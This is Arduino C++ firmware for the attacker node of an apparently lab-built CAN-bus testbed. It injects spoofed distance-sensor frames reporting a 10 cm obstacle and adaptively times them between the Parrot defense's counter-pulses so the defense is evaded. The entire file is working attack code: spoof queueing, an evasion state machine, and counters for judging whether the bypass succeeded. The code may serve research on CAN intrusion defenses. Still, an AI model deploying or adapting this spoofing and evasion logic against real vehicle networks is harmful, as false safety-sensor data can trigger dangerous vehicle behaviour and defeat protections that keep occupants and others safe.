// Node C: adaptive low-and-slow attack that surfs between Parrot pulses.
// Compiled only when selected in NodeConfig.h.
#include "NodeConfig.h"
#if ACTIVE_NODE == NODE_C
#include <Arduino.h>
#include <SPI.h>
#include <EEPROM.h>
#include <mcp2515_can.h>
#include "Protocol.h"

// Shield and serial configuration.
const uint8_t CAN_CS = 9;
const uint8_t CAN_CLOCK = MCP_16MHz;
const uint32_t CAN_SPEED = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;

const char ROLE = 'C';

// Timing is based on observed bus activity instead of a fixed spoof period.
const uint32_t LAUNCH_AFTER_SENSOR_MS = 8;
const uint32_t LAUNCH_WINDOW_MS = 160;
const uint32_t PARROT_QUIET_MS = 60;
const uint32_t PARROT_START_TIMEOUT_MS = 1000;
const uint32_t STATS_INTERVAL_MS = 2000;

// Driver instance for the shield connected through chip-select D9.
mcp2515_can can(CAN_CS);

// State machine for one spoof followed by one observed Parrot pulse.
enum SurfState : uint8_t {
  SURF_DISABLED,
  SURF_WAIT_BASELINE,
  SURF_WAIT_PULSE,
  SURF_WAIT_QUIET
};

// Counters separate successful spoofing from observed defensive traffic.
struct Counters {
  uint32_t rx, bad, unrelated, overflow;
  uint32_t spoofQueued, spoofOk, spoofFail, spoofTimeout;
  uint32_t dmessages, parrotBursts, quietRelaunches, pulseTimeouts;
} counts = {};

// Controller and attack state.
bool ready = false;
bool halted = false;
bool txBusy = false;
bool abortRequested = false;
bool attackEnabled = false;
bool haveLegitimateSensor = false;
bool pulseSeenForSpoof = false;
SurfState surfState = SURF_DISABLED;

// Protocol values and wrap-safe timestamps.
uint16_t bootSession = 0;
uint16_t customSeq = 1;
uint32_t txStarted = 0;
uint32_t lastInit = 0;
uint32_t lastDiag = 0;
uint32_t lastStats = 0;
uint32_t lastLegitimateSensorAt = 0;
uint32_t spoofQueuedAt = 0;
uint32_t lastDmessageAt = 0;

// Error high-water marks make accidental collisions visible in the logs.
uint8_t previousErrorState = 0xff;
uint8_t controllerPeakTec = 0;
uint8_t controllerPeakRec = 0;
uint8_t controllerEflgSeen = 0;

// Reads one MCP2515 register through the SPI READ command.
uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x03);
  SPI.transfer(address);
  const uint8_t value = SPI.transfer(0);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
  return value;
}

// Updates selected MCP2515 register bits without changing the others.
void regModify(uint8_t address, uint8_t mask, uint8_t value) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x05);
  SPI.transfer(address);
  SPI.transfer(mask);
  SPI.transfer(value);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
}

// Prints a timestamped event tagged with node C.
void event(const __FlashStringHelper *message) {
  Serial.print(millis());
  Serial.print(F(" C "));
  Serial.println(message);
}

// Returns a short name for the current pulse-surfing state.
const __FlashStringHelper *stateName() {
  if (surfState == SURF_WAIT_BASELINE) return F("WAIT_BASELINE");
  if (surfState == SURF_WAIT_PULSE) return F("WAIT_PULSE");
  if (surfState == SURF_WAIT_QUIET) return F("WAIT_QUIET");
  return F("DISABLED");
}

// Prints the controller's error counters and flags.
void printRegisters() {
  Serial.print(F("EFLG=0x")); Serial.print(regRead(0x2d), HEX);
  Serial.print(F(" TEC=")); Serial.print(regRead(0x1c));
  Serial.print(F(" REC=")); Serial.print(regRead(0x1d));
  Serial.print(F(" TX0CTRL=0x")); Serial.println(regRead(0x30), HEX);
}

// Prints the evidence used to decide whether Parrot was bypassed.
void printStats() {
  Serial.print(F("STATS C state=")); Serial.print(stateName());
  Serial.print(F(" enabled=")); Serial.print(attackEnabled ? 1 : 0);
  Serial.print(F(" rx=")); Serial.print(counts.rx);
  Serial.print(F(" bad=")); Serial.print(counts.bad);
  Serial.print(F(" unrelated=")); Serial.print(counts.unrelated);
  Serial.print(F(" overflow=")); Serial.print(counts.overflow);
  Serial.print(F(" spoof_queued=")); Serial.print(counts.spoofQueued);
  Serial.print(F(" spoof_ok=")); Serial.print(counts.spoofOk);
  Serial.print(F(" spoof_fail=")); Serial.print(counts.spoofFail);
  Serial.print(F(" spoof_timeout=")); Serial.print(counts.spoofTimeout);
  Serial.print(F(" dmessages=")); Serial.print(counts.dmessages);
  Serial.print(F(" parrot_bursts=")); Serial.print(counts.parrotBursts);
  Serial.print(F(" quiet_relaunch=")); Serial.print(counts.quietRelaunches);
  Serial.print(F(" no_pulse=")); Serial.print(counts.pulseTimeouts);
  Serial.print(F(" peak_TEC=")); Serial.print(controllerPeakTec);
  Serial.print(F(" peak_REC=")); Serial.print(controllerPeakRec);
  Serial.print(F(" EFLG_seen=0x")); Serial.println(controllerEflgSeen, HEX);
  if (ready) printRegisters();
}

// Preserves short error-counter changes that periodic logs could miss.
void sampleControllerHighWater() {
  const uint8_t tec = regRead(0x1c);
  const uint8_t rec = regRead(0x1d);
  const uint8_t eflg = regRead(0x2d);
  if (tec > controllerPeakTec) controllerPeakTec = tec;
  if (rec > controllerPeakRec) controllerPeakRec = rec;
  controllerEflgSeen |= eflg;
}

// Resets and configures the MCP2515 without One-Shot or nonstandard behavior.
bool initializeCan() {
  pinMode(10, OUTPUT); digitalWrite(10, HIGH);
  pinMode(4, OUTPUT); digitalWrite(4, HIGH);
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) {
    event(F("CAN_INIT_FAIL"));
    return false;
  }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  if (can.init_Mask(0, 0, 0) != CAN_OK ||
      can.init_Mask(1, 0, 0) != CAN_OK) return false;
  for (uint8_t i = 0; i < 6; ++i) {
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  }
  regModify(0x60, 0x64, 0x04);
  regModify(0x70, 0x60, 0);
  regModify(0x2c, 0x04, 0);
  // Keep OSM disabled: this attack avoids the pulse instead of changing the
  // controller's normal automatic retransmission behavior.
  regModify(0x0f, 0x08, 0);
  txBusy = false;
  halted = false;
  abortRequested = false;
  previousErrorState = 0xff;
  event(F("CAN_READY 11bit 500k DLC8 OSM=OFF"));
  return true;
}

// Queues one valid 10 cm SENSOR frame and starts watching for Parrot.
bool queueStopSpoof(uint32_t now, bool quietRelaunch) {
  if (!ready || halted || txBusy) return false;

  uint8_t frame[8];
  Lab::encode(frame, customSeq, Lab::SPOOF_STOP_CM, 0, bootSession);
  regModify(0x2c, 0x04, 0);
  if (can.trySendMsgBuf(Lab::SENSOR_ID, 0, 0, Lab::DLC, frame, 0) != CAN_OK) {
    ++counts.spoofFail;
    return false;
  }

  ++customSeq;
  ++counts.spoofQueued;
  if (quietRelaunch) ++counts.quietRelaunches;
  txBusy = true;
  abortRequested = false;
  txStarted = now;
  spoofQueuedAt = now;
  pulseSeenForSpoof = false;
  surfState = SURF_WAIT_PULSE;
  return true;
}

// Records completion or failure of the spoof queued in TX buffer zero.
void serviceTx(uint32_t now) {
  if (!txBusy) return;
  const uint8_t ctrl = regRead(0x30);
  if (!(ctrl & 0x08)) {
    const bool success = (regRead(0x2c) & 0x04) && !(ctrl & 0x50);
    if (success) ++counts.spoofOk;
    else {
      ++counts.spoofFail;
      surfState = attackEnabled ? SURF_WAIT_BASELINE : SURF_DISABLED;
    }
    regModify(0x2c, 0x04, 0);
    txBusy = false;
  } else if (!abortRequested &&
             Lab::elapsed(now, txStarted, Lab::TX_DEADLINE_MS)) {
    regModify(0x0f, 0x10, 0x10);
    abortRequested = true;
    ++counts.spoofTimeout;
  }

  if (!txBusy) {
    regModify(0x0f, 0x10, 0);
    abortRequested = false;
  }
}

// Samples errors and clears RX overflow without logging during a Parrot pulse.
void diagnostics(uint32_t now) {
  if (!Lab::elapsed(now, lastDiag, 2)) return;
  lastDiag = now;
  const uint8_t flags = regRead(0x2d);
  const bool pulseWindow = surfState == SURF_WAIT_PULSE ||
                           surfState == SURF_WAIT_QUIET;
  const uint8_t state = flags & 0x3f;
  if (state != previousErrorState) {
    previousErrorState = state;
    if (!pulseWindow) {
      event(F("CAN_STATE_CHANGED"));
      printRegisters();
    }
  }
  if (flags & 0xc0) {
    ++counts.overflow;
    regModify(0x2d, 0xc0, 0);
  }
  if ((flags & 0x20) && !halted) {
    halted = true;
    attackEnabled = false;
    surfState = SURF_DISABLED;
    event(F("UNEXPECTED_BUS_OFF"));
  }
}

// Drains RX quickly and identifies legitimate samples and zero Dmessages.
void receiveFrames(uint32_t now) {
  for (uint8_t n = 0; n < 24 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0;
    uint8_t data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) {
      ++counts.bad;
      continue;
    }
    const uint32_t id = can.getCanId();
    const bool ext = can.isExtendedFrame();
    const bool rtr = can.isRemoteRequest();
    ++counts.rx;
    if (ext || rtr) {
      ++counts.bad;
      continue;
    }
    if (id != Lab::SENSOR_ID) {
      ++counts.unrelated;
      continue;
    }
    if (len != Lab::DLC) {
      ++counts.bad;
      continue;
    }

    if (Lab::allZero(data)) {
      ++counts.dmessages;
      lastDmessageAt = now;
      if (surfState == SURF_WAIT_PULSE && !pulseSeenForSpoof) {
        pulseSeenForSpoof = true;
        ++counts.parrotBursts;
      }
      if (surfState == SURF_WAIT_PULSE || surfState == SURF_WAIT_QUIET) {
        surfState = SURF_WAIT_QUIET;
      }
      continue;
    }

    if (Lab::validSensor(data)) {
      haveLegitimateSensor = true;
      lastLegitimateSensorAt = now;
    } else {
      ++counts.bad;
    }
  }
}

// Launches only outside the pulse, exploiting Parrot's second-strike nature.
void servicePulseSurfing(uint32_t now) {
  if (surfState == SURF_DISABLED) return;

  if (surfState == SURF_WAIT_BASELINE) {
    if (!haveLegitimateSensor) return;
    const uint32_t age = uint32_t(now - lastLegitimateSensorAt);
    if (age < LAUNCH_AFTER_SENSOR_MS || age > LAUNCH_WINDOW_MS) return;
    event(F("SURF_INITIAL_SPOOF cm=10"));
    queueStopSpoof(now, false);
    return;
  }

  if (surfState == SURF_WAIT_PULSE) {
    if (!pulseSeenForSpoof &&
        Lab::elapsed(now, spoofQueuedAt, PARROT_START_TIMEOUT_MS)) {
      ++counts.pulseTimeouts;
      event(F("SURF_NO_PARROT_PULSE"));
      surfState = attackEnabled ? SURF_WAIT_BASELINE : SURF_DISABLED;
    }
    return;
  }

  if (surfState == SURF_WAIT_QUIET &&
      Lab::elapsed(now, lastDmessageAt, PARROT_QUIET_MS)) {
    if (!attackEnabled) {
      surfState = SURF_DISABLED;
      return;
    }
    // Serial output is safe here because B's pulse has already gone quiet.
    Serial.print(now);
    Serial.print(F(" C SURF_RELAUNCH cycle="));
    Serial.print(counts.parrotBursts);
    Serial.print(F(" dmessages="));
    Serial.println(counts.dmessages);
    queueStopSpoof(millis(), true);
  }
}

// Prints the serial commands supported by this attack firmware.
void help() {
  event(F("h help | s stats | r reinit CAN"));
  event(F("C: a toggle adaptive pulse surfing | 1 one valid spoof"));
}

// Reads and executes at most one serial command per loop iteration.
void commands() {
  if (!Serial.available()) return;
  const char command = Serial.read();
  if (command == 'h') help();
  if (command == 's') printStats();
  if (command == 'r') {
    attackEnabled = false;
    surfState = SURF_DISABLED;
    ready = initializeCan();
    lastInit = millis();
    event(F("CAN_REINIT"));
  }
  if (command == 'a') {
    attackEnabled = !attackEnabled;
    if (attackEnabled) {
      surfState = SURF_WAIT_BASELINE;
      event(F("PULSE_SURFING_ON"));
    } else {
      event(F("PULSE_SURFING_OFF"));
      if (surfState == SURF_WAIT_BASELINE) surfState = SURF_DISABLED;
    }
  }
  if (command == '1' && !txBusy) {
    event(F("SINGLE_SPOOF cm=10"));
    queueStopSpoof(millis(), false);
  }
}

// Initializes Serial, the attack session, and the CAN controller.
void setup() {
  Serial.begin(SERIAL_SPEED);
  EEPROM.get(0, bootSession);
  bootSession = (bootSession == 0xffffU || bootSession == 0xfffeU) ?
    1 : uint16_t(bootSession + 1);
  if (!bootSession) bootSession = 1;
  EEPROM.put(0, bootSession);
  event(F("NODE_INIT PULSE_SURFING"));
  ready = initializeCan();
  lastInit = millis();
  help();
}

// Cooperatively drains Parrot traffic and advances the adaptive state machine.
void loop() {
  uint32_t now = millis();
  commands();
  if (!ready) {
    if (Lab::elapsed(now, lastInit, 2000)) {
      lastInit = now;
      ready = initializeCan();
    }
    return;
  }

  sampleControllerHighWater();
  diagnostics(now);
  serviceTx(now);
  receiveFrames(millis());
  servicePulseSurfing(millis());

  const bool pulseWindow = surfState == SURF_WAIT_PULSE ||
                           surfState == SURF_WAIT_QUIET;
  if (!pulseWindow && Lab::elapsed(millis(), lastStats, STATS_INTERVAL_MS)) {
    lastStats = millis();
    printStats();
  }
}
#endif  // ACTIVE_NODE == NODE_C
